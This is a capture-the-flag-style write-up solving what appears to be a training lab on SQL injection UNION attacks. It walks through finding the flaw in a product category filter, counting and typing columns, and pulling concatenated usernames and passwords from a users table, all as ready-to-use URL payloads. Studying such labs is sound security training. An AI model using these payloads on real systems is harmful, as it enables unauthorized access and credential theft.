# SQL injection UNION attack, retrieving multiple values in a single column
# Objective
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.\
\
The database contains a different table called users, with columns called username and password.\
\
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

# Solution
`/filter?category=’` —> Application is vulnerable 

## Determining the number of columns
`/filter?category=Pets' order by 1--` \
`/filter?category=Pets' order by 2--` \
`/filter?category=Pets' order by 3--` -> Error \
`/filter?category=Pets' union select null, null--` -> Number of columns = 2

## Determining the types of columns
`/filter?category=Pets' union select 'a', 'a'--` -> Error \
`/filter?category=Pets' union select 1, 'a'--` -> First column - int, second - string

## Retrieving usernames and passwords
Credentials (user~pass) \
`/filter?category=' union select null, username || '~' || password from users--`